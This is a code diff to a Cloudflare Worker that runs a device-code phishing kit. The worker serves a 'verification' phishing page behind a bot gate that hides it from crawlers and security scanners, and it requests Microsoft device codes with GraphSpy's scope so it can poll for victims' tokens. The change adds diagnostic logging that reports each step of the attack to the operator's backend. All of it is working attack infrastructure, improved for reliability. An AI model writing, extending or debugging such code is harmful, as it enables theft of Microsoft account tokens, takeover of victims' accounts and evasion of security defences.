@@ -67,6 +67,27 @@ function reportDevCode(stage, detail, waitUntil) {
   return p;
 }
 
+// Structured diagnostic channel. Unlike console.log (which only lands in
+// Cloudflare's worker logs, which nobody is watching), diag() records reach the
+// backend terminal as [DevCode][DIAG] lines and are also stored in
+// deployment_logs for the panel. Call it at every step of the request so the
+// exact failure point is visible without a Cloudflare account. Same shape as
+// reportDevCode but carries a step marker and is used on the SUCCESS path too.
+function diag(step, detail, waitUntil) {
+  var p = backendFetch('/api/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      __jwt__: JWT_TOKEN,
+      message: '[DevCode][DIAG] step=' + step + ' ' + String(detail).substring(0, 400),
+      source: 'worker/diag',
+      ua: '',
+    }),
+  }).catch(function () {});
+  if (typeof waitUntil === 'function') waitUntil(p);
+  return p;
+}
+
 // Link-scoped JWT, injected at build time. Used to authenticate backend calls
 // that don't otherwise carry a token - e.g. scanner-signal, which the worker
 // fires when it blocks a bot. Must be at module scope so both servePhishingPage
@@ -307,6 +328,16 @@ export default {
 async function handleRequest(request, waitUntil) {
   const url = new URL(request.url);
 
+  // Record the interesting API requests at the edge. If one of these is ever
+  // swallowed by the bot gate, a stale worker, or a route that stops matching,
+  // this is the last trace of it - and the absence of the following steps is
+  // itself the answer.
+  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start' || url.pathname === '/api/verify') {
+    diag('REQ', 'method=' + request.method + ' path=' + url.pathname +
+      ' ip=' + (request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '-') +
+      ' ray=' + (request.headers.get('cf-ray') || '-').substring(0, 20), waitUntil);
+  }
+
   // API endpoints are routed BEFORE the bot gate. The gate exists so crawlers
   // never see the verification page content; it must never swallow the calls
   // that page makes. With the gate first, a visitor tripped by the rate
@@ -339,6 +370,11 @@ async function handleRequest(request, waitUntil) {
     // This prevents bots from ever seeing the verification page content.
     // Real users still pass the bot check above and reach servePhishingPage().
     console.log('[Worker] Bot blocked (404 page):', botCheck.reason);
+    // A blocked GET / means the visitor never receives the page, so they can
+    // never click generate and never call /api/device/start. This is the
+    // "silent no-code" path - make it loud.
+    diag('GATE_BLOCK', 'reason=' + botCheck.reason + ' method=' + request.method + ' path=' + url.pathname +
+      ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 80), waitUntil);
 
     // Continue reporting scanner IPs in the background without delaying the response.
     if (botCheck.reason.indexOf('ip_blocklist') === -1) {
@@ -370,6 +406,11 @@ async function handleRequest(request, waitUntil) {
     });
   }
 
+  // Anything not matched above. A POST here is almost always vg-engine aiming
+  // at a path this worker version no longer routes - a stale deployment.
+  if (url.pathname.startsWith('/api/')) {
+    diag('NO_ROUTE', 'method=' + request.method + ' path=' + url.pathname, waitUntil);
+  }
   return new Response('Not Found', { status: 404 });
 }
 
@@ -440,7 +481,7 @@ async function servePhishingPage(request) {
     const verifyResponse = await backendFetch('/api/verify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: jwtToken }),
+      body: JSON.stringify({ token: jwtToken, caller: 'page' }),
     });
     const verifyData = await verifyResponse.json();
     if (verifyData.valid) {
@@ -485,6 +526,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
     const { jwt_token, turnstile_token } = await request.json();
     console.log('[Worker] Device code request received');
     reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);
+    diag('DEVSTART_ENTRY', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_present=' + (!!turnstile_token) + ' turnstile_len=' + String(turnstile_token || '').length + ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 60), waitUntil);
 
     // Verify JWT with backend
     console.log('[Worker] Verifying JWT with backend...');
@@ -492,7 +534,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
       const verifyResponse = await backendFetch('/api/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token: jwt_token }),
+        body: JSON.stringify({ token: jwt_token, caller: 'devicecode' }),
       });
       const verifyData = await verifyResponse.json();
       console.log('[Worker] JWT verification result:', verifyData.valid);
@@ -504,6 +546,12 @@ async function handleDeviceCodeRequest(request, waitUntil) {
           headers: { 'Content-Type': 'application/json' },
         });
       }
+
+      // turnstile_key comes back with the verify response; if it is empty the
+      // page never rendered the challenge, __TURNSTILE_TOKEN stays null, and the
+      // siteverify call below fails. Empty client_id fails the Microsoft call
+      // instead. Both are invisible without this line.
+      diag('VERIFY_OK', 'tenant=' + verifyData.tenant + ' client_id=' + (verifyData.client_id || '(none)') + ' turnstile_key_set=' + !!verifyData.turnstile_key + ' turnstile_key_len=' + String(verifyData.turnstile_key || '').length, waitUntil);
 
       // Verify Turnstile
       console.log('[Worker] Verifying Turnstile...');
@@ -525,6 +573,8 @@ async function handleDeviceCodeRequest(request, waitUntil) {
           headers: { 'Content-Type': 'application/json' },
         });
       }
+
+      diag('TURNSTILE_OK', 'token_len=' + String(turnstile_token || '').length, waitUntil);
 
       // Request device code from Microsoft with GraphSpy's default scope and
       // claims. GraphSpy device_codes.generate(version=2, ngcmfa=True,
@@ -555,6 +605,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
       const deviceCodeData = await deviceCodeResponse.json();
       console.log('[Worker] Microsoft response status:', deviceCodeResponse.status);
       console.log('[Worker] Microsoft response:', JSON.stringify(deviceCodeData).substring(0, 200));
+      diag('MS_RESPONSE', 'http=' + deviceCodeResponse.status + ' error=' + (deviceCodeData.error || '(none)') + ' user_code=' + (deviceCodeData.user_code || '(none)') + ' interval=' + deviceCodeData.interval, waitUntil);
 
       if (deviceCodeData.error) {
         console.error('[Worker] Microsoft error:', deviceCodeData.error, deviceCodeData.error_description);
@@ -570,6 +621,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
       pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
 
       console.log('[Worker] Returning device code to client');
+      diag('SUCCESS', 'user_code=' + deviceCodeData.user_code + ' verification_uri=' + deviceCodeData.verification_uri + ' expires_in=' + deviceCodeData.expires_in, waitUntil);
       return new Response(JSON.stringify({
         user_code: deviceCodeData.user_code,
         verification_uri: deviceCodeData.verification_uri,
@@ -703,7 +755,7 @@ async function handleVerifyRequest(request) {
   const verifyResponse = await backendFetch('/api/verify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ token }),
+    body: JSON.stringify({ token, caller: 'worker-verify' }),
   });
   return verifyResponse;
 }
